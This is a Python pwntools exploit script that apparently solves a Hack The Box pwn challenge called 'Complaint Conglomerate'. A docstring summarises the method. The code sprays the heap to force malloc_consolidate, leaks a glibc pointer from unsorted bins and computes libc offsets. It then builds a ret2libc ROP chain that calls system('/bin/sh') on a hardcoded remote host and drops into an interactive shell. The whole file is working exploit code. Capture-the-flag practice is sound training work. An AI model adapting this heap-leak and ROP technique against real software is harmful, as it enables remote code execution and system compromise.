""" HTB | Complaint Conglomerate
This challenge involves getting a glibc leak through consolidating fastbin chunks, and then using ROP to ret2libc:
  - Fill up the heap with chunks so that malloc_consolidate will be called when the top chunk is empty
  - Make sure to have 3 fastbins already allocated so they become unsorted bins
  - Leak the glibc address of the unsorted bins
  - Use the glibc leak to find /bin/sh, system, and some ROP gadgets
  - Put them all together and call system('/bin/sh') using ret2libc
"""
from pwn import *

context.binary = 'complaint_conglomerate'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

HOST = '94.237.49.212' 
PORT = 35877

def get_process():
  #return process() # use this if you want to test locally
  return remote(HOST, PORT)

def main():
  proc = get_process()

  # Load up the heap with chunks so we can call malloc_consolidate (this takes a while)
  for i in range(1390):
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b': ', b'A'*0x50)
    print(f'\rProgress: {i}/1390', end='')
  print()

  # Add chuncks for tcache and fastbins
  for i in range(10):
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b': ', str(i).encode())
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b': ', b'A'*0x50)

  # Fill up tcache (7) and fastbins (3)
  for i in range(10):
    proc.sendlineafter(b'> ', b'2')
    proc.sendlineafter(b': ', str(i).encode())

  # Magic time, malloc(0x30) to force malloc to consolidate, which turns fastbin chunks to unsorted bin chunks
  for i in range(2):
    proc.sendlineafter(b'> ', b'1')
    proc.sendlineafter(b': ', b'1')
    proc.sendlineafter(b': ', b'0')
    proc.sendlineafter(b': ', b'B'*0x30)

  # Grab glibc pointer
  proc.sendlineafter(b'> ', b'3')
  proc.sendlineafter(b': ', b'8')
  glibc_leak = int.from_bytes(proc.recvline().strip(), 'little')

  # Calculate the glibc base, and all of the other addresses
  glibc_base = glibc_leak - 0x1d2cc0
  glibc_system = glibc_base + 0x4c490
  glibc_bin_sh = glibc_base + 0x196031
  glibc_pop_rdi = glibc_base + 0x1034d0
  glibc_ret = glibc_base + 0xf60cd

  # Create the ROP Chain, we need to store this in a heap
  # This will override RIP when the AI function is called
  payload = b''.join([
    b'A'*0x28,
    p64(glibc_pop_rdi),
    p64(glibc_bin_sh),
    p64(glibc_ret),
    p64(glibc_system)
  ])

  # Create a chunk with our payload
  proc.sendlineafter(b'> ', b'1')
  proc.sendlineafter(b': ', b'1')
  proc.sendlineafter(b': ', b'1')
  proc.sendlineafter(b': ', payload)

  # Call the AI function and trigger our payload
  proc.sendlineafter(b'> ', b'4')
  proc.sendlineafter(b'> ', b'y')
  proc.sendlineafter(b': ', b'1')

  proc.interactive()

if __name__ == '__main__':
  main()
